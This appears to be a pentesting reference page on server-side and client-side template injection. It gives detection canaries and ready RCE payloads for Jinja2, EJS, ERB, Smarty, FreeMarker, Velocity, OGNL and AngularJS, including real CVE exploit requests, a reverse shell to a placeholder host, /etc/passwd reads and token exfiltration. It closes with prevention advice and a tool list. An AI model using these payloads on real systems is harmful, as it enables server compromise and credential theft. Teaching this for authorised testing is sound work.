Server-Side Template Injection

Specimens 14⚑ Practice — PortSwigger: Server-side template injection
⚠ Thin coverage — only 14 disclosed reports for this class; illustrative, not exhaustive.

§Basic information

Server-Side Template Injection (SSTI) happens when user input reaches a template engine's compile/eval path instead of its data path — so your string is parsed as template code and executed on the server, not rendered as an inert value. Engines mix a text template with a data context; the bug is feeding attacker text into the template half.

Because the template language exposes the host runtime (Python objects, the Node require graph, Java classes, PHP {php}), SSTI is a short hop from "my string renders" to "my code runs". Treat it as a near-universal RCE primitive — file read, command execution, full server compromise — not a reflection curiosity. Its client-side cousin CSTI (an AngularJS {{7*7}} that evaluates in the browser) shares the exact detection reflex and sandbox-escape mechanics, so it lives here too.

§Methodology

  1. Map inputs → template sinks. For every field, header, and JSON/GraphQL value, find where it is later rendered. The high-value pattern is second-order: a value stored on one surface (profile name) rendered by a template on another (the welcome email).
  2. Fire the arithmetic canary in each engine's delimiters. Data renders it literally; a template engine computes it. {{7*7}} → 49 is the whole tell.
  3. Fingerprint the engine from which delimiter fired, then a language probe ({{'7'*7}} for Python, {$smarty.version} for Smarty, {{this}} for JS engines).
  4. Escalate along that engine's runtime — Python __subclasses__() → Popen, JS __proto__.constructor → require, Java expression-language → ScriptEngineManager → ProcessBuilder.
  5. For blind / second-order, plant the probe and wait for the out-of-band render (email subject/body, error page, PDF). Check the delivered artifact, not the HTTP response.
# One canary that tells XSS from SSTI in a single shot kZ9x"'<>{{7*7}}${7*7}#{7*7} # {{7*7}}/49 -> template engine (SSTI/CSTI); "'<> reflected raw -> pivot to XSS instead.

§Technique variants

Group by engine family — each exposes the host runtime differently.

Python — Jinja2 / Twig-style {{ }}

Walk the class hierarchy from any built-in object up to object, then down to a subclass that wraps os/subprocess, and call it.

{{ [].__class__.__base__.__subclasses__() }} {{ ''.__class__.mro()[1].__subclasses__() }} {# index the Popen subclass and run a command: #} {{ ''.__class__.mro()[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}

NodeJS — Handlebars / Pug / EJS

JS engines reach code execution by traversing the prototype chain to constructor → require('child_process'). When the framework compiles a raw request string as a template, it is immediate RCE.

{{this.__proto__.constructor.name}} <!-- Object -> escalate via constructor -> require -->
// @fastify/view reply.view({raw}) or Rails-style raw EJS: request string -> compile() <%= require("child_process").execSync("id").toString() %> <%= require("child_process").execSync("bash -i >& /dev/tcp/COLLAB/4444 0>&1") %>

Ruby — ERB (render inline:)

Any request-derived string reaching render inline: / ERB.new compiles as ERB, so backtick shell-out executes.

<% `touch me` %> <%= system("id") %>

Send it url-encoded where the field is passed on a query string: %3C%25%20%60touch%20me%60%20%25%3E.

PHP — Smarty {php}

When {php} tags (or insecure modifiers) are enabled, raw PHP inside the template runs — file read and RCE.

{$smarty.version} {php}$s = file_get_contents('/etc/passwd',NULL,NULL,0,100); var_dump($s);{/php}

Java — FreeMarker / Velocity / OGNL

The JVM engines pivot into Runtime/ProcessBuilder, often via a scripting engine. Command output is usually reflected inline, so these are blind-free RCE.

# FreeMarker Execute gadget (VMware Workspace ONE deviceUdid, CVE-2022-22954) GET /catalog-portal/ui/oauth/verify?error=&deviceUdid=${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")} # Velocity reflection -> Runtime.exec (unauthenticated Apache Solr, wt=velocity) # $x must be defined first (#set($x='')) so $x.class.forName(...) resolves GET /solr/CORE/select?q=1&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)%23set($rt=$x.class.forName(%27java.lang.Runtime%27))%20$rt.getRuntime().exec(%27id%27) # OGNL -> ScriptEngineManager('JavaScript') -> ProcessBuilder (Confluence CVE-2021-26084) # single quotes are Unicode-escaped to slip the OGNL keyword/WAF filter — send exactly this escaped form queryString=aaa\u0027%2b{Class.forName(\u0027javax.script.ScriptEngineManager\u0027).newInstance().getEngineByName(\u0027JavaScript\u0027).\u0065val(\u0027var p=new java.lang.ProcessBuilder();p.command(\u0022bash\u0022,\u0022-c\u0022,\u0022cat /etc/passwd\u0022);p.redirectErrorStream(true);p.start()\u0027)}%2b\u0027

Client-side — AngularJS (CSTI)

Angular evaluates {{ }} in the browser against $scope. Escape the expression sandbox (version-specific) to run arbitrary JS, or — even inside the sandbox — read $scope and leak it through any request-issuing attribute.

// AngularJS 1.1.5 sandbox escape (delimiters remapped to [[ ]] here) [[constructor.constructor('alert(document.cookie)')()]] // No JS-exec needed: walk the scope, exfiltrate via an image GET // {{7*7}} confirms; then read $$childHead/$$nextSibling and set a victim avatar src to //COLLAB/?d=<token>
▸ TIP
Enumerate the object graph before guessing gadgets. In Ruby/Liquid, probes like {{ class }}, {{ methods | json }}, and especially {{ to_yaml }} dump exposed methods and hidden fields (password hashes the UI never shows) — info disclosure short of RCE, but often enough to escalate (#98259).

§Escalation & impact

SSTI is usually the endpoint, not a step — it is the RCE. Two escalation shapes recur:

  • Engine → host runtime → RCE. JS engines walk __proto__.constructor to require('child_process') (#423541, #3122019); Python walks __subclasses__() to Popen (#125980); Java expression-languages pivot through ScriptEngineManager('JavaScript') into ProcessBuilder (#1327769), or Velocity reflects on java.lang.Runtime (#822002). Unauth product CVEs (VMware FreeMarker, Confluence OGNL, Solr Velocity) turn a fingerprint into pre-auth server compromise.
  • CSTI → XSS → ATO. A stored Angular expression viewed by an admin steals the session for full account takeover (#141463); or read $scope and leak other users' tokens with no XSS at all (#271960). See the sibling XSS page for the sandbox-escape and delivery mechanics.
  • Info disclosure short of RCE. Liquid to_yaml / method enumeration dumps hidden fields even where the engine is sandboxed against exec (#98259).

§Prevention

  • Never render user input as a template. Pass it as a context variable into a pre-authored template so {{7*7}} displays literally. render inline: params[...] and reply.view({raw}) fed by request data are the bug itself.
  • Sandbox and lock down the engine: Jinja2 SandboxedEnvironment, disable Smarty {php} and insecure modifiers, remove Solr's VelocityResponseWriter/DIH, keep FreeMarker/OGNL products patched to the CVE fix.
  • Remember async sinks: a profile field that only ever reaches a mail template must still be treated as untrusted at mail-generation time — that is where the render happens.
  • CSTI: mark user-data regions ng-non-bindable and upgrade off sandbox-broken AngularJS. A field where {{7*7}} renders literally with no surrounding ng-* binding is not exploitable.

§Tools

  • tplmap — engine fingerprinting and automated exploitation across Jinja2/ERB/FreeMarker/Velocity/Smarty.
  • Burp Repeater/Intruder — fire the fingerprint set and drive second-order probing (submit → open the email).
  • Burp Collaborator / any canary host — for blind SSTI where output lands in an email or error page.
  • Browser DevTools console — angular.version, $scope walking, and sandbox-escape testing for CSTI.
  • Source-code grep — render inline:, ERB.new, compile(, renderString, reply.view({raw fed by request data.

Root cause

An endpoint passes a request parameter straight to `render inline: params[:content]`, which compiles and evaluates the string as an ERB template, so embedded Ruby executes on the server.

Method

  1. Find a response that reflects input where render inline / ERB.new / Liquid-style rendering is used
  2. Submit an ERB expression payload
  3. Observe server-side evaluation (command output / file effect)
# request param 'content': <% `touch me` %> # url-encoded: %3C%25%20%60touch%20me%60%20%25%3E

Insight — Whenever user input reaches a template renderer (Rails render inline:, ERB.new, Jinja, Twig), test the language's expression syntax first (<%= 7*7 %>, {{7*7}}). Rails `render inline:` on any request-derived string is an immediate RCE primitive — grep controllers for `render inline:` / `render text:` fed by params.
